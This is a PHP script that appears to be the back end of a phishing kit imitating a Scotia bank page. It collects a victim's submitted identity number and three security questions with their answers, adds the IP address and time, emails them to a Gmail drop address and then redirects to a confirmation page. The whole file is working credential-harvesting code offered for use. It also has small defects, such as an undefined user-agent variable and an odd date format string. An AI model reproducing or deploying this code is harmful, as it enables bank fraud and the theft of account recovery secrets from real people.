<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['q1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['q2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['q3'];
$data ="
=============##SCOTIA##========================
Question 1:  $secretQuestion1Key
Answer 1:   $secretAnswer1
Question 2:  $secretQuestion2Key
Answer 2:   $secretAnswer2
Question 3:  $secretQuestion3Key
Answer 3:   $secretAnswer3
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'results1113@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: ./confirm.html");

?>